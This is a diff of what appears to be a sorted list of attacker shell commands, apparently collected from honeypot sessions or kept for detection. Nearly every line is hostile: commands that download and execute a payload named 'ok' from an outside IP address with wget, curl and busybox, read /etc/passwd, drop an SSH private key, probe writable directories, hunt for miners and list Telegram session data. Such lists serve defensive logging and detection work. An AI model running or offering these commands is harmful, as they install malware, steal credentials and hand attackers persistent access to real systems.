@@ -22,14 +22,14 @@ uname -a
 ping; sh
 echo xsec
 /bin/./uname -s -v -n -r -m
-cat /etc/passwd
 cd /tmp
 curl -O http://5.182.210.174/ok
-echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
-id
 rm -rf ok ok.1
 sh ok
 wget http://5.182.210.174/ok
+cat /etc/passwd
+echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"
+id
 -----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no
 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg
 >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x59\x49\x48\x4a\x59\x43'
@@ -39,24 +39,26 @@ QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
 bash
 cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----
-uname -s -m
 exit
-&k`g&k|zpkfq)ES[M
+uname -s -m
 (cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
 ./ok
-/ip cloud print
 /userfs/bin/wget http://5.182.210.174/ok
->/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x42\x58\x4d\x4f\x4f\x51'
->/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x46\x59\x51\x50\x47\x51'
-Accept-Encoding: gzip
 busybox curl -O http://5.182.210.174/ok
 busybox sh ok
 busybox wget http://5.182.210.174/ok
-cat /proc/cpuinfo
 cd /dev
 cd /var/tmp
 chmod +x ok
 chmod 777 ok
+rm -rf ok
+rm -rf ok.1
+&k`g&k|zpkfq)ES[M
+/ip cloud print
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x42\x58\x4d\x4f\x4f\x51'
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /tmp;>/var/.x&&cd /var;/bin/busybox echo -e '\x46\x59\x51\x50\x47\x51'
+Accept-Encoding: gzip
+cat /proc/cpuinfo
 echo Hi | cat -n
 g & k | zpkfq
 ifconfig
@@ -66,8 +68,6 @@ ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop
 ls /
 ps -ef | grep '[Mm]iner'
 ps | grep '[Mm]iner'
-rm -rf ok
-rm -rf ok.1
 za
 zalee
 zpz}ld
